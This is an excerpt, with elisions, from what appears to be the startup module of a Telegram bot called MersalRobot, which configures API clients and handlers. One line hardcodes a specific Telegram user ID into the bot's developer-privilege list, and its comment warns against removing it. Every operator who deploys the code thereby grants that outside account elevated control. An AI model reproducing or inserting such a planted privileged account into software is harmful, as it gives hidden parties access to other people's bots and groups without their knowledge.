...
if ENV:
    ...
    TELEGRAPH_SHORT_NAME = os.environ.get("TELEGRAPH_SHORT_NAME", "MersalRobot")
...
DEV_USERS.add(5682621421) #it you going to remove me don't ask me errors👿
...
from MersalRobot.config import ARQ_API_KEY, ARQ_API_URL


aiohttpsession = ClientSession()
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
telethn = TelegramClient("Mersal", API_ID, API_HASH)
pgram = Client("MersalRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
...
from MersalRobot.modules.helper_funcs.handlers import (CustomCommandHandler,
